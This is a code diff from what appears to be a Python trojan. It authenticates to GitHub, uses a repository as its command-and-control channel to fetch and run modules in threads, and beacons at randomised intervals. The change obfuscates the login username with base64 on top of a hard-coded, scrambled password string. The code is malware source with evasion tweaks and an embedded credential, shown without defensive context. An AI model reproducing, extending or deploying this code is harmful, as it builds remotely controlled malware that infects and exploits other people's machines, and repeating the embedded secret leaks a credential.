@@ -20,8 +20,8 @@ task_queue = Queue.Queue()
 ghp = "3f8d45b9cba5ee27ff835054106834cc148efad9"
 
 def connect_to_github():
-    gh = login(username="cizzit", password=(''.join([ghp[12:23], ghp[-17:], ghp[:12]])))
-    repo = gh.repository("cizzit", "chapter7")
+    gh = login(username=base64.b64decode('Y2l6eml0'), password=(''.join([ghp[12:23], ghp[-17:], ghp[:12]])))
+    repo = gh.repository(base64.b64decode('Y2l6eml0'), "chapter7")
     branch = repo.branch("master")
 
     return gh, repo, branch
@@ -93,4 +93,4 @@ while True:
             t = threading.Thread(target=module_runner, args=(task['module'],))
             t.start()
             time.sleep(random.randint(1,10))
-    time.sleep(random.randint(1000,10000))
+    time.sleep(random.randint(1000, 10000))
